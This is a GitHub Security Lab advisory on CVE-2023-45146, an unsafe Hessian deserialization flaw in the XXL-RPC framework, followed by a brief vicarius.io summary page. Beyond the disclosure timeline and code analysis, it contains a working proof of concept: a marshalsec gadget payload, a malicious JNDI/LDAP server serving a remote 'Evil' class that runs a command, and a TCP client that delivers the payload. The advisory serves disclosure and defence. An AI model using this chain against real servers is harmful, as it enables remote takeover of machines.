=== Content from securitylab.github.com_7c618dbb_20250111_055607.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

October 13, 2023
# GHSL-2023-052: Unsafe deserialization in XXL-RPC - CVE-2023-45146

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
Tony Torralba, Joseph Farebrother](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2023-03-28: Report sent to 931591021@qq.com
* 2023-06-14: Opened a [public issue](https://github.com/xuxueli/xxl-rpc/issues/52) asking for a private way to report the vulnerability.
* 2023-06-27: Deadline expires

## Summary

XXL-RPC is a high performance, distributed RPC framework. With it, a TCP server can be set up using the Netty framework and the Hessian serialization mechanism. When such a configuration is used, attackers may be able to connect to the server and provide malicious serialized objects that, once deserialized, force it to execute arbitrary code. This can be abused to take control of the machine the server is running in.

## Product

XXL-RPC

## Tested Version

[1.7.0](https://github.com/xuxueli/xxl-rpc/releases/tag/1.7.0)

## Details

### Unsafe deserialization in `HessianSerializer.java` (`GHSL-2023-052`)

The XXL-RPC framework implements several ways of setting up a server and deserializing incoming data. An application can be configured to use a Netty server and a Hessian deserializer as follows:

```
XxlRpcProviderFactory providerFactory = new XxlRpcProviderFactory();
providerFactory.setServer(NettyServer.class);
providerFactory.setSerializer(HessianSerializer.class);

```

It can be seen that `NettyServer` uses `NettyDecoder` to decode incoming messages:

[`xxl-rpc-core/src/main/java/com/xxl/rpc/core/remoting/net/impl/netty/server/NettyServer.java:57`](https://github.com/xuxueli/xxl-rpc/blob/eeaa1bd7fc8f2249de13f971dda4f6689d66f318/xxl-rpc-core/src/main/java/com/xxl/rpc/core/remoting/net/impl/netty/server/NettyServer.java#L57)

```
channel.pipeline()
        // --snip--
        .addLast(new NettyDecoder(XxlRpcRequest.class, xxlRpcProviderFactory.getSerializerInstance()))

```

With such a configuration, incoming messages will be received in `NettyDecoder.decode`:

[`xxl-rpc-core/src/main/java/com/xxl/rpc/core/remoting/net/impl/netty/codec/NettyDecoder.java:15-45`](https://github.com/xuxueli/xxl-rpc/blob/eeaa1bd7fc8f2249de13f971dda4f6689d66f318/xxl-rpc-core/src/main/java/com/xxl/rpc/core/remoting/net/impl/netty/codec/NettyDecoder.java#L15-L45)

```
public class NettyDecoder extends ByteToMessageDecoder {

    // --snip--

    @Override
    public final void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) throws Exception {
        // --snip--
        int dataLength = in.readInt();
        if (dataLength < 0) {
            ctx.close();
        }
        // --snip--
        byte[] data = new byte[dataLength];
        in.readBytes(data);

        Object obj = serializer.deserialize(data, genericClass);
        out.add(obj);
    }
}

```

As it can be seen, first an integer is read from the message, indicating the length of the actual data. Said data is then read and directly passed to `serializer.deserialize`. Since the serializer was configured to be `HessianSerializer`, deserialization is handled by it:

[`xxl-rpc-core/src/main/java/com/xxl/rpc/core/serialize/impl/HessianSerializer.java:45`](https://github.com/xuxueli/xxl-rpc/blob/eeaa1bd7fc8f2249de13f971dda4f6689d66f318/xxl-rpc-core/src/main/java/com/xxl/rpc/core/serialize/impl/HessianSerializer.java#L45)

```
@Override
public <T> Object deserialize(byte[] bytes, Class<T> clazz) {
    ByteArrayInputStream is = new ByteArrayInputStream(bytes);
    Hessian2Input hi = new Hessian2Input(is);
    try {
        Object result = hi.readObject();
        return result;
    }
    // --snip--
}

```

The message bytes are directly passed to `Hessian2Input.readObject`, which will proceed to deserialize the object sent in the message.

Note that XXL-RPC uses `com.caucho`’s implementation of Hessian, which is known to be vulnerable to unsafe deserialization. Other implementations attempt to mitigate this issue by including a disallow list of forbidden objects, such as [`sofa-hessian`](https://github.com/sofastack/sofa-hessian/pull/8/commits/fb5b8562cd9cd85be771b1b0df51174916571421), but this approach isn’t perfect either (see the **Remediation** section).

#### Impact

This issue may lead to Remote Code Execution (RCE).

#### Resources

The exploitation of this vulnerability varies depending on the deserialization gadgets available in the classpath of the application using the XXL-RPC framework. As described in [this blog post](https://www.alibabacloud.com/help/en/enterprise-distributed-application-service/latest/security-updates-rce-vulnerability-in-dubbo-applications), several conditions must be met in order to achieve remote code execution using this vulnerability.

As a proof of concept, and for the sake of simplicity, we make the following assumptions:

1. The application has `Rome` as one of its dependencies:

```
<dependency>
  <groupId>com.rometools</groupId>
  <artifactId>rome</artifactId>
  <version>1.7.0</version>
</dependency>

```

1. Remote class loading is allowed (either because an old JDK version is being used, or by using the JVM argument `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`)

If these two conditions are met, the `XxlRpcServerApplication` class in XXL-RPC’s samples directory can be launched, which sets up a Netty server listening at port 7080.

Then, a malicious payload forcing a JNDI resolution to a server of our choosing can be generated with [`marshalsec`](https://github.com/mbechler/marshalsec):

```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 Rome ldap://localhost:1389 > payload.bin

```

We set up a malicious JNDI server that returns a reference to a remote codebase also running in a server we control:

```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:8000/\#Evil 1389

```

The HTTP server running at port 8000 serves the `.class` file of the `Evil` class, which has the following source code:

```
public class Evil {
    static {
        try {
            Runtime.getRuntime()
                    .exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (Exception e) {
        }
    }
}

```

Finally, we can write a TCP client that sends the appropriate message to the Netty server to trigger the RCE:

```
import java.io.DataOutputStream;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;

public class TcpClient {

    public static void main(String[] args) {
        try {
            byte[] DESERIALIZATION_PAYLOAD = Files.readAllBytes(Paths.get("payload.bin"));
            Socket socket = new Socket("localhost", 7080);
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            out.writeInt(DESERIALIZATION_PAYLOAD.length);
            out.write(DESERIALIZATION_PAYLOAD);
            out.flush();
            socket.close();
        } catch (Exception ex) {
            System.err.println(ex);
        }
    }
}

```
## Credit

This issue was discovered and reported by the GitHub CodeQL team members [@atorralba (Tony Torralba)](https://github.com/atorralba) and [@joefarebrother (Joseph Farebrother)](https://github.com/joefarebrother).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-052` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from www.vicarius.io_6622e946_20250111_055609.html ===


 [about](/vsociety/about) [by vicarius](https://vicarius.io/) [log in](/vsociety/sign/in) [join community](/vsociety/sign/up)

* [scripts](/vsociety/posts)
* [CVEs](/vsociety/vulnerabilities)
* [apps](/vsociety/products)
* [OS](/vsociety/operating-systems)

 [by @jakaba](/vsociety/users/jakaba)23 Feb 2024160609#cve\_analysis

Write a blog analysis for a CVE

[publish](/vsociety/sign/in)see all related posts
# XXL-RPC RCE (CVE-2023-45146)

 [by @jakaba](/vsociety/users/jakaba)16 [by @jakaba](/vsociety/users/jakaba)23 Feb 2024160609#cve\_analysis

Write a blog analysis for a CVE

[publish](/vsociety/sign/in)see all related posts
# XXL-RPC RCE (CVE-2023-45146)

CVEs

[CVE-2023-45146](/vsociety/vulnerabilities/cve-2023-45146)10 Critical Severity

Apps

X[Xxl-Rpc](/vsociety/products/122114_173251/xxl-rpc)Xxl-Rpc Project1.0.1M.\*1.7.0.\*1.4.2.\*1.2.2.\*1.4.0.\*1.3.2.\*1.2.1.\*1.5.0.\*1.2.0.\*1.3.0.\*
## Screenshots from the blog posts

![images/clsw0j62g03t81hn02wdiek9j.jpg](data:image/svg+xml;charset=UTF-8...)![images/clsw0j62g03t81hn02wdiek9j.jpg](data:image/svg+xml;charset=UTF-8...)
## Summary

One of the key offerings from the XXL series is XXL-RPC, a high-performance, distributed Remote Procedure Call (RPC) framework. It enables the establishment of TCP servers using the Netty framework and the Hessian serialization mechanism. However, a critical vulnerability has been identified in the XXL-RPC framework, posing a potential threat to systems utilizing this technology.

## Description

Tags

[#RCE](/vsociety/search?hashtags=rce)[#serialization](/vsociety/search?hashtags=serialization)[#trending](/vsociety/search?hashtags=trending)[#CVE-2023-45146](/vsociety/search?hashtags=cve-2023-45146)[#XXL-RPC](/vsociety/search?hashtags=xxl-rpc)[![users/photos/clj8b3h1k16g10uoihwvzgsxi.png](data:image/svg+xml;charset=UTF-8...)](/vsociety/users/jakaba)[@jakaba](/vsociety/users/jakaba)

74 posts

subscribe to user

Total vcoins

64.3K

Social media links

jakabakos@MrJakaba92Akos Jakab

show more

 remediate more CVEs with vRx  [explore more](https://www.vicarius.io/?utm_source=vsociety&utm_medium=organic&utm_campaign=cve_scripts%26analysis) Comments (1)submitshow 5 more replies[![users/photos/clj8b3h1k16g10uoihwvzgsxi.png](data:image/svg+xml;charset=UTF-8...)](/vsociety/users/jakaba)[@jakaba](/vsociety/users/jakaba)

74 posts

subscribe to user

Total vcoins

64.3K

Share

Social media links

jakabakos@MrJakaba92Akos Jakab

show more

CVEs

[CVE-2023-45146](/vsociety/vulnerabilities/cve-2023-45146)10 Critical Severity

Apps

X[Xxl-Rpc](/vsociety/products/122114_173251/xxl-rpc)Xxl-Rpc Project1.0.1M.\*1.7.0.\*1.4.2.\*1.2.2.\*1.4.0.\*1.3.2.\*1.2.1.\*1.5.0.\*1.2.0.\*1.3.0.\*

Tags

[#RCE](/vsociety/search?hashtags=rce)[#serialization](/vsociety/search?hashtags=serialization)[#trending](/vsociety/search?hashtags=trending)[#CVE-2023-45146](/vsociety/search?hashtags=cve-2023-45146)[#XXL-RPC](/vsociety/search?hashtags=xxl-rpc)

Democratizing infosec research for a more secure society. Be a part of the movement.

##### about

* [An Origin Story: vsociety](/vsociety/posts/an-origin-story-vsociety)
* [Frequently Asked Questions](/vsociety/faq)
##### be Part

* [Join Community](/vsociety/sign/up)
* [Login](/vsociety/sign/in)
##### legal

* [Privacy Policy](/vsociety/privacy-policy)
* [Terms of Use](/vsociety/terms)

Copyright © Vicarius 2022. [Privacy Policy](https://www.vicarius.io/privacy) and [Terms of Use](/vsociety/terms)


